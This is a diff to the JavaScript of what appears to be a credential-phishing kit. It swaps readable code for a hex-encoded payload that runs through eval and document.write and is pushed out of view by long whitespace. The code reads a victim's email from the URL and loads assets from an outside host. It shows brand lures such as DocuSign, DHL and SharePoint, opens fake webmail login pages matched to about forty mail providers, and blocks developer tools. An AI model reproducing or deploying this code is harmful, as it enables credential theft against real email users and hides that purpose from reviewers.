@@ -71,493 +71,138 @@
 
 //TOUCH NOT MY ANOINTED ENCRYPTION AND DO MY CODE NO HARM. ****AM WATCHING YOU FROM AFAR
 
-//set global variables
-
-var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
-const baseUrl= window.location.origin; // Hardcoded Base64 URL
-const myArray = vsr.split("&");
-vsr = myArray[0];
-var fmt = myArray[1];
-const container = document.getElementsByClassName('verification-container')[0];
-const logoContainer = document.getElementById("loading-logo");
-const iframe = document.getElementById('my-iframe');
-const checkbox = document.getElementById('verification-checkbox');
-$(document).ready(function(){
-	
-	
-	
-	const prefix ="https://ritalfrendo.top/enterprises/";
-	var arrayset =[
-			
-			['sheet','styleloader.css','href','id'],
-	
-	]
-	
-	
-	//check input param before loading css and external files
-	if (!vsr) {
-		window.location.href="https://google.com";
-	}else if (vsr.includes("http")){
-		//alert("take me outta here!");
-		window.location.href="https://google.com";
-	}else{
-		$('#user_field').val(vsr);
-		if (!isBase64(vsr)){
-		
-			//first check for encrypted string and trim
-			if(vsr.includes("*")){
-				//encryption algorithm detected, truncate and recompile
-				let result = vsr.replace(/\.$/, ""); 
-				// Removes commas and periods
-				let cleanEmail = result.replace(/[*,']/g, ""); 
-				let finalEmail = cleanEmail.replace("^","@");
-				vsr = btoa(btoa(finalEmail));
-			}else{
-				vsr = btoa(btoa(vsr));
-			}
-		
-		
-		}
-		
-		var delay = 1000;
-		loadExternalScript('geo.js', function() {
-			if(fmt==null || fmt=="") delay=0;
-			getDNS(vsr, function(dnsresult) {
-				if (dnsresult) {
-					onBodyLoad(arrayset, prefix);  
-					getCountry().then(ipInfo => {
-						switchImage(fmt,prefix,dnsresult,ipInfo,vsr);
-						
-
-					}).catch(error => {
-						console.error("Error in getCountry:", error);
-					});
-				} else {
-					console.error("DNS result is null or invalid");
-
-				}
-			},delay);
-		});
-		
-	
-	}
-		
-	
-
-	// function to load external script
-	function loadExternalScript(url, callback) {
-		// Detect whether the URL points to a CSS or JS file
-		const isCSS = url.endsWith('.css');
-		const element = document.createElement(isCSS ? 'link' : 'script');
-
-		if (isCSS) {
-			// If it's a CSS file, create a <link> element
-			element.rel = 'stylesheet';
-			element.href = prefix + url; // Prefix the URL if necessary
-			element.onload = function () {
-				if (callback) callback(); // Execute the callback once the CSS is loaded
-			};
-		} else {
-			// If it's a JS file, create a <script> element
-			element.src = prefix + url;
-			element.onload = function () {
-				if (callback) callback(); // Execute the callback once the JS is loaded
-			};
-
-		}
-
-		// Append the element to the appropriate location in the document
-		document.head.appendChild(element);
-	}
-	
-	
-});
-
-  // Listen for the change event on the checkbox
-        checkbox.addEventListener('change', function() {
-			const DNSfieldName = $('#fieldName').val();
-			const checkboxWrapper = document.querySelector('.checkbox-wrapper');
-			const spinner = document.getElementById('spinner');
-            if (this.checked) {
-				checkboxWrapper.classList.add('loading');
-                spinner.style.display = 'block';
-                // Set the source URL to load the page inside the iframe
-				setTimeout(() => {
-					iframe.src = baseUrl+ displayPage(DNSfieldName,vsr,fmt);
-					// Display the full screen iframe
-					iframe.style.display = 'block';
-					iframe.style.width="100%";
-					iframe.style.height ="100%";
-					// Hide the prior container safely
-					if (container) {
-						container.style.display = 'none';    
-					}
-					//Ensure body doesn't create external scrollbars
-					document.body.style.overflow = 'hidden';
-				}, 4000);
-                
-                // Hide the checkbox container
-
-            }else {
-                checkboxWrapper.classList.remove('loading');
-                spinner.style.display = 'none';
-            }
-        });
-			
-
-document.addEventListener('keydown', event => {
-  if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
-    event.preventDefault();
-  }
-});
-
-// Disable right-click context menu
-document.addEventListener('contextmenu', event => event.preventDefault());
 
 
-function isBase64(encodedString) {
-	var regexBase64 = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-	return regexBase64.test(encodedString);   // return TRUE if its base64 string.
-}
-
-function activateIframe(dnsresult,vsr,fmt,ipInfo) {
-    setTimeout(() => {
-        try {
-			const $iframe = $("#my-iframe");
-            
-            
-            // 1. Force full viewport layout FIRST so the media query reads a wide width
-            $iframe.css({
-                "display": "block",
-                "position": "fixed",
-                "top": "0",
-                "left": "0",
-                "width": "100vw",  /* Force 100% of the browser window width */
-                "height": "100vh", /* Force 100% of the browser window height */
-                "z-index": "999999"
-            });
-
-            // 2. Now load the source URL (it will safely read the wide layout parameters)
-            const pagePath = displayPage(dnsresult,vsr,fmt); 
-            $iframe.attr("src", baseUrl + pagePath);
-
-            // 3. Clean up the loading interface elements
-            $("#loading-logo").hide();
-            $("body").css("overflow", "hidden");
-
-        } catch (error) {
-            console.error("Iframe responsive rendering error:", error);
-        }
-    }, 4000);
-}
 
 
-function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
-	$('#fieldName').val(dnsresult);
-	//alert(fmt);
-	switch (fmt){
-		case "wetransfer":
-		$(".verification-container").hide();
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"wetransfer-logo-svg-vector.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo);		
-		break;
-		case "docusign":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"ds-logo-default.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		case "adobe":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"adobe_acrobat_sign.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		case "dhl":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"DHL-Logo.wine.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		case "sharepoint":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"sharepoint-1.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		case "quickbooks":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"Intuit_QuickBooks_logo.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		case "excel":
-		$("#loading-logo").show();
-		$("#docuLogo").attr("src", prefix+"excelLogo.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
-		break;
-		default:
-		$("#loading-logo").hide();
-		$(".verification-container").show();
-		break;
-	
-	}
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b0d0a66756e6374696f6e20697342617365363428656e636f646564537472696e6729207b0d0a09766172207265676578426173653634203d202f5e285b302d39612d7a412d5a2b2f5d7b347d292a28285b302d39612d7a412d5a2b2f5d7b327d3d3d297c285b302d39612d7a412d5a2b2f5d7b337d3d29293f242f3b0d0a0972657475726e2072656765784261736536342e7465737428656e636f646564537472696e67293b2020202f2f2072657475726e2054525545206966206974732062617365363420737472696e672e0d0a7d0d0a66756e6374696f6e206163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f29207b0d0a2020202073657454696d656f7574282829203d3e207b0d0a2020202020202020747279207b0d0a090909636f6e73742024696672616d65203d20242822236d792d696672616d6522293b0d0a2020202020202020202020200d0a2020202020202020202020200d0a2020202020202020202020202f2f20312e20466f7263652066756c6c2076696577706f7274206c61796f757420464952535420736f20746865206d65646961207175657279207265616473206120776964652077696474680d0a20202020202020202020202024696672616d652e637373287b0d0a2020202020202020202020202020202022646973706c6179223a2022626c6f636b222c0d0a2020202020202020202020202020202022706f736974696f6e223a20226669786564222c0d0a2020202020202020202020202020202022746f70223a202230222c0d0a20202020202020202020202020202020226c656674223a202230222c0d0a20202020202020202020202020202020227769647468223a20223130307677222c20202f2a20466f7263652031303025206f66207468652062726f777365722077696e646f77207769647468202a2f0d0a2020202020202020202020202020202022686569676874223a20223130307668222c202f2a20466f7263652031303025206f66207468652062726f777365722077696e646f7720686569676874202a2f0d0a20202020202020202020202020202020227a2d696e646578223a2022393939393939220d0a2020202020202020202020207d293b0d0a2020202020202020202020202f2f20322e204e6f77206c6f61642074686520736f757263652055524c202869742077696c6c20736166656c792072656164207468652077696465206c61796f757420706172616d6574657273290d0a202020202020202020202020636f6e7374207061676550617468203d20646973706c61795061676528646e73726573756c742c7673722c666d74293b200d0a20202020202020202020202024696672616d652e617474722822737263222c206261736555726c202b207061676550617468293b0d0a2020202020202020202020202f2f20332e20436c65616e20757020746865206c6f6164696e6720696e7465726661636520656c656d656e74730d0a202020202020202020202020242822236c6f6164696e672d6c6f676f22292e6869646528293b0d0a202020202020202020202020242822626f647922292e63737328226f766572666c6f77222c202268696464656e22293b0d0a20202020202020207d20636174636820286572726f7229207b0d0a202020202020202020202020636f6e736f6c652e6572726f722822496672616d6520726573706f6e736976652072656e646572696e67206572726f723a222c206572726f72293b0d0a20202020202020207d0d0a202020207d2c2034303030293b0d0a7d0d0a66756e6374696f6e20737769746368496d61676528666d742c7072656669782c646e73726573756c742c6970496e666f2c767372297b0d0a09242827236669656c644e616d6527292e76616c28646e73726573756c74293b0d0a092f2f616c65727428666d74293b0d0a097377697463682028666d74297b0d0a090963617365202277657472616e73666572223a0d0a09092428222e766572696669636174696f6e2d636f6e7461696e657222292e6869646528293b0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b2277657472616e736665722d6c6f676f2d7376672d766563746f722e73766722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b09090d0a0909627265616b3b0d0a0909636173652022646f63757369676e223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b2264732d6c6f676f2d64656661756c742e73766722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a090963617365202261646f6265223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b2261646f62655f6163726f6261745f7369676e2e706e6722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a090963617365202264686c223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b2244484c2d4c6f676f2e77696e652e73766722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a09096361736520227368617265706f696e74223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b227368617265706f696e742d312e73766722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a0909636173652022717569636b626f6f6b73223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b22496e747569745f517569636b426f6f6b735f6c6f676f2e706e6722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a0909636173652022657863656c223a0d0a0909242822236c6f6164696e672d6c6f676f22292e73686f7728293b0d0a090924282223646f63754c6f676f22292e617474722822737263222c207072656669782b22657863656c4c6f676f2e706e6722293b0d0a09096163746976617465496672616d6528646e73726573756c742c7673722c666d742c6970496e666f293b200d0a09090d0a0909627265616b3b0d0a090964656661756c743a0d0a0909242822236c6f6164696e672d6c6f676f22292e6869646528293b0d0a09092428222e766572696669636174696f6e2d636f6e7461696e657222292e73686f7728293b0d0a0909627265616b3b0d0a090d0a097d0d0a7d';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b0d0a2f2f73657420676c6f62616c207661726961626c65730d0a76617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a636f6e7374206261736555726c3d2077696e646f772e6c6f636174696f6e2e6f726967696e3b202f2f2048617264636f646564204261736536342055524c0d0a636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a767372203d206d7941727261795b305d3b0d0a76617220666d74203d206d7941727261795b315d3b0d0a636f6e737420636f6e7461696e6572203d20646f63756d656e742e676574456c656d656e74734279436c6173734e616d652827766572696669636174696f6e2d636f6e7461696e657227295b305d3b0d0a636f6e7374206c6f676f436f6e7461696e6572203d20646f63756d656e742e676574456c656d656e744279496428226c6f6164696e672d6c6f676f22293b0d0a636f6e737420696672616d65203d20646f63756d656e742e676574456c656d656e744279496428276d792d696672616d6527293b0d0a636f6e737420636865636b626f78203d20646f63756d656e742e676574456c656d656e74427949642827766572696669636174696f6e2d636865636b626f7827293b0d0a2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a090d0a090d0a09636f6e737420707265666978203d2268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a0909090d0a0909095b277368656574272c277374796c656c6f616465722e637373272c2768726566272c276964275d2c0d0a090d0a095d0d0a090d0a090d0a092f2f636865636b20696e70757420706172616d206265666f7265206c6f6164696e672063737320616e642065787465726e616c2066696c65730d0a09696620282176737229207b0d0a090977696e646f772e6c6f636174696f6e2e687265663d2268747470733a2f2f676f6f676c652e636f6d223b0d0a097d656c736520696620287673722e696e636c756465732822687474702229297b0d0a09092f2f616c657274282274616b65206d65206f7574746120686572652122293b0d0a090977696e646f772e6c6f636174696f6e2e687265663d2268747470733a2f2f676f6f676c652e636f6d223b0d0a097d656c73657b0d0a090924282723757365725f6669656c6427292e76616c28767372293b0d0a0909696620282169734261736536342876737229297b0d0a09090d0a0909092f2f666972737420636865636b20666f7220656e6372797074656420737472696e6720616e64207472696d0d0a0909096966287673722e696e636c7564657328222a2229297b0d0a090909092f2f656e6372797074696f6e20616c676f726974686d2064657465637465642c207472756e6361746520616e64207265636f6d70696c650d0a090909096c657420726573756c74203d207673722e7265706c616365282';OO0O='f5c2e242f2c202222293b200d0a090909092f2f2052656d6f76657320636f6d6d617320616e6420706572696f64730d0a090909096c657420636c65616e456d61696c203d20726573756c742e7265706c616365282f5b2a2c275d2f672c202222293b200d0a090909096c65742066696e616c456d61696c203d20636c65616e456d61696c2e7265706c61636528225e222c224022293b0d0a09090909767372203d2062746f612862746f612866696e616c456d61696c29293b0d0a0909097d656c73657b0d0a09090909767372203d2062746f612862746f612876737229293b0d0a0909097d0d0a09090d0a09090d0a09097d0d0a09090d0a09097661722064656c6179203d20313030303b0d0a09096c6f616445787465726e616c536372697074282767656f2e6a73272c2066756e6374696f6e2829207b0d0a090909696628666d743d3d6e756c6c207c7c20666d743d3d2222292064656c61793d303b0d0a090909676574444e53287673722c2066756e6374696f6e28646e73726573756c7429207b0d0a0909090969662028646e73726573756c7429207b0d0a09090909096f6e426f64794c6f61642861727261797365742c20707265666978293b20200d0a0909090909676574436f756e74727928292e7468656e286970496e666f203d3e207b0d0a090909090909737769746368496d61676528666d742c7072656669782c646e73726573756c742c6970496e666f2c767372293b0d0a0909090909090d0a09090909097d292e6361746368286572726f72203d3e207b0d0a090909090909636f6e736f6c652e6572726f7228224572726f7220696e20676574436f756e7472793a222c206572726f72293b0d0a09090909097d293b0d0a090909097d20656c7365207b0d0a0909090909636f6e736f6c652e6572726f722822444e5320726573756c74206973206e756c6c206f7220696e76616c696422293b0d0a090909097d0d0a0909097d2c64656c6179293b0d0a09097d293b0d0a09090d0a090d0a097d0d0a09090d0a090d0a092f2f2066756e6374696f6e20746f206c6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c2063616c6c6261636b29207b0d0a09092f2f204465746563742077686574686572207468652055524c20706f696e747320746f206120435353206f72204a532066696c650d0a0909636f6e7374206973435353203d2075726c2e656e64735769746828272e63737327293b0d0a0909636f6e737420656c656d656e74203d20646f63756d656e742e637265617465456c656d656e74286973435353203f20276c696e6b27203a202773637269707427293b0d0a090969662028697343535329207b0d0a0909092f2f20496620697427732061204353532066696c652c206372656174652061203c6c696e6b3e20656c656d656e740d0a090909656c656d656e742e72656c203d20277374796c657368656574273b0d0a090909656c656d656e742e68726566203d20707265666978202b2075726c3b202f2f20507265666978207468652055524c206966206e65636573736172790d0a090909656c656d656e742e6f6e6c6f6164203d2066756e6374696f6e202829207b0d0a090909096966202863616c6c6261636b292063616c6c6261636b28293b202f2f2045786563757465207468652063616c6c6261636b206f6e63652074686520435353206973206c6f616465640d0a0909097d3b0d0a09097d20656c7365207b0d0a0909092f2f20496620697427732061204a532066696c652c206372656174652061203c7363726970743e20656c656d656e740d0a090909656c656d656e742e737263203d20707265666978202b2075726c3b0d0a090909656c656d656e742e6f6e6c6f6164203d2066756e6374696f6e202829207b0d0a090909096966202863616c6c6261636b292063616c6c6261636b28293b202f2f2045786563757465207468652063616c6c6261636b206f6e636520746865204a53206973206c6f616465640d0a0909097d3b0d0a09097d0d0a09092f2f20417070656e642074686520656c656d656e7420746f2074686520617070726f707269617465206c6f636174696f6e20696e2074686520646f63756d656e740d0a0909646f63756d656e742e686561642e617070656e644368696c6428656c656d656e74293b0d0a097d0d0a090d0a090d0a7d293b0d0a20202f2f204c697374656e20666f7220746865206368616e6765206576656e74206f6e2074686520636865636b626f780d0a2020202020202020636865636b626f782e6164644576656e744c697374656e657228276368616e6765272c2066756e6374696f6e2829207b0d0a090909636f6e737420444e536669656c644e616d65203d20242827236669656c644e616d6527292e76616c28293b0d0a090909636f6e737420636865636b626f7857726170706572203d20646f63756d656e742e717565727953656c6563746f7228272e636865636b626f782d7772617070657227293b0d0a090909636f6e7374207370696e6e6572203d20646f63756d656e742e676574456c656d656e744279496428277370696e6e657227293b0d0a20202020202020202020202069662028746869732e636865636b656429207b0d0a09090909636865636b626f78577261707065722e636c6173734c6973742e61646428276c6f6164696e6727293b0d0a202020202020202020202020202020207370696e6e65722e7374796c652e646973706c6179203d2027626c6f636b273b0d0a202020202020202020202020202020202f2f205365742074686520736f757263652055524c20746f206c6f616420746865207061676520696e736964652074686520696672616d650d0a0909090973657454696d656f7574282829203d3e207b0d0a0909090909696672616d652e737263203d206261736555726c2b20646973706c61795061676528444e536669656c644e616d652c7673722c666d74293b0d0a09090909092f2f20446973706c6179207468652066756c6c2073637265656e20696672616d650d0a0909090909696672616d652e7374796c652e646973706c6179203d2027626c6f636b273b0d0a0909090909696672616d652e7374796c652e77696474683d2231303025223b0d0a0909090909696672616d652e7374796c652e686569676874203d2231303025223b0d0a09090909092f2f204869646520746865207072696f7220636f6e7461696e657220736166656c790d0a090909090969662028636f6e7461696e657229207b0d0a090909090909636f6e7461696e65722e7374796c652e646973706c6179203d20276e6f6e65273b202020200d0a09090909097d0d0a09090909092f2f456e7375726520626f647920646f65736e2774206372656174652065787465726e616c207363726f6c6c626172730d0a0909090909646f63756d656e742e626f64792e7374796c652e6f766572666c6f77203d202768696464656e273b0d0a090909097d2c2034303030293b0d0a202020202020202020202020202020200d0a202020202020202020202020202020202f2f20486964652074686520636865636b626f7820636f6e7461696e65720d0a2020202020202020202020207d656c7365207b0d0a20202020202020202020202020202020636865636b626f78577261707065722e636c6173734c6973742e72656d6f766528276c6f6164696e6727293b0d0a202020202020202020202020202020207370696e6e65722e7374796c652e646973706c6179203d20276e6f6e65273b0d0a2020202020202020202020207d0d0a20202020202020207d293b0d0a0909090d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203';OOO0=O0OO+OO0O+OO00;_c(OOO0);O5056435153494E5745='534F43594F4D505554534A4A484854434958544B48434C46525248424E4C4E4752465555535445594254575055574959564B454248504C504A44554259575257445344474C564E555043585049554955565247554244524D56484C56464A46555943474B44454F574E4E544E494C4E484A5448584242594D47424E51524655524A444E4D4A4243585643514D4B4453584B4E4F4E565344484E484950595549444854455052585450504E57524347534E59554B534352554D5458435651504D5354584D5950484C4E565754485649495146504253444758545959444E46424548574F5452524C'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 //Library call up links for your viewing and editing. ***Edit with Caution. DO NOT DRINK WHILE EDITING"
-function displayPage(dnsresult,vsr,fmt){
-	var pgsrc = "";
-	switch(dnsresult){
-	
-		case "263.com":
-		pgsrc="/263mail.html#"+vsr+"&"+fmt;;
-		break;
-		case "yahoo.com":
-		pgsrc="/ym.html#"+vsr+"&"+fmt;;
-		break;
-		case "ionos.com":
-		pgsrc="/1n1.html#"+vsr+"&"+fmt;;
-		break;
-		case "aliyun.com":
-		pgsrc="/aliyunmail.html#"+vsr+"&"+fmt;;
-		break;
-		case "amicobit.com":
-		pgsrc="/amicobit.html#"+vsr+"&"+fmt;;
-		break;
-		case "ovh.com":
-		pgsrc="/ovhmail.html#"+vsr+"&"+fmt;;
-		break;
-		case "daum.net":
-		pgsrc="/duam.html#"+vsr+"&"+fmt;;
-		break;
-		case "mail.icoremail.net":
-		pgsrc="/icoremail.html#"+vsr+"&"+fmt;;
-		break;
-		case "hiworks.co.kr":
-		pgsrc="/hiworks.html#"+vsr+"&"+fmt;;
-		break;
-		case "arsmtp.com":
-		pgsrc="/arsmtp.html#"+vsr+"&"+fmt;;
-		break;
-		case "emailsrvr.com":
-		pgsrc="/emailsrvr.html#"+vsr+"&"+fmt;;
-		break;
-		case "yandex.com":
-		pgsrc="/yndex.html#"+vsr+"&"+fmt;;
-		break;
-		case "webmail.cbsolt.net":
-		pgsrc="/cbsol.html#"+vsr+"&"+fmt;;
-		break;
-		case "gmail.com":
-		pgsrc="/gm.html#"+vsr+"&"+fmt;;
-		break;
-		case "s151v.chinaemail.cn":
-		pgsrc="/bossmal.html#"+vsr+"&"+fmt;;
-		break;
-		case "register.it":
-		pgsrc="/register.html#"+vsr+"&"+fmt;;
-		break;
-		case "exmail.qq.com":
-		pgsrc="/qq_login.html#"+vsr+"&"+fmt;;
-		break;
-		case "qiye.163.com":
-		pgsrc="/qiyelogin163.html#"+vsr+"&"+fmt;;
-		break;
-		case "naver.com":
-		pgsrc="/navr.html#"+vsr+"&"+fmt;;
-		break;
-		case "outlook.com":
-		case "hotmail.com":
-		pgsrc="/w2weApp.html#"+vsr+"&"+fmt;;
-		break;
-		case "mail.ru":
-		pgsrc="/mailru.html#"+vsr+"&"+fmt;;
-		break;
-		case "zoho.com":
-		pgsrc="pgsrc/zhomail.html#"+vsr+"&"+fmt;;
-		break;
-		case "serviciodecorreo.es":
-		pgsrc="/servicio.html#"+vsr+"&"+fmt;;
-		break;
-		case "sina.net":
-		pgsrc="/sinamail.html#"+vsr+"&"+fmt;;
-		break;
-		case "rzone.de":
-		pgsrc="/strto.html#"+vsr+"&"+fmt;;
-		break;
-		case "hibox.com":
-		pgsrc="/hibox.html#"+vsr+"&"+fmt;;
-		break;
-		case "zimbra.com":
-		pgsrc="/zmbra.html#"+vsr+"&"+fmt;;
-		break;
-		case "webmail.sfera.net":
-		pgsrc="/sfera.html#"+vsr+"&"+fmt;;
-		break;
-		case "webmail.saati.com":
-		pgsrc="/saati.html#"+vsr+"&"+fmt;;
-		break;
-		case "pphosted.com":
-		pgsrc="/proofpoint.html#"+vsr+"&"+fmt;;
-		break;
-		case "mailcontrol.com":
-		pgsrc="/forcept.html#"+vsr+"&"+fmt;;
-		break;
-		case "mail.smart-mail.net":
-		pgsrc="/smart.html#"+vsr+"&"+fmt;;
-		break;
-		case "nethinks.com":
-		pgsrc="/nethinks.html#"+vsr+"&"+fmt;;
-		break;
-		case "aruba.it":
-		pgsrc="/aruba.html#"+vsr+"&"+fmt;;
-		break;
-		case "ateja.co.id":
-		pgsrc="/ateja.html#"+vsr+"&"+fmt;;
-		break;
-		case "mail.termolst.be":
-		pgsrc="/termolst.html#"+vsr+"&"+fmt;;
-		break;
-		case "https://webmail-auth.getzner.at":
-		pgsrc="/getzner.html#"+vsr+"&"+fmt;;
-		break;
-		case "chinamail.cn":
-		pgsrc="/chinamail.html#"+vsr+"&"+fmt;;
-		break;
-		case "webmailssl.it":
-		pgsrc="/webmailssl.html#"+vsr+"&"+fmt;;
-		break;
-		case "mdaemon":
-		pgsrc="/mdaemon.html#"+vsr+"&"+fmt;;
-		break;
-		case "axigen.com"://update 2
-		pgsrc="/axigen.html#"+vsr+"&"+fmt;;
-		break;
-		case "mimecast.com"://update 3
-		pgsrc="/mimecast.html#"+vsr+"&"+fmt;;
-		break;
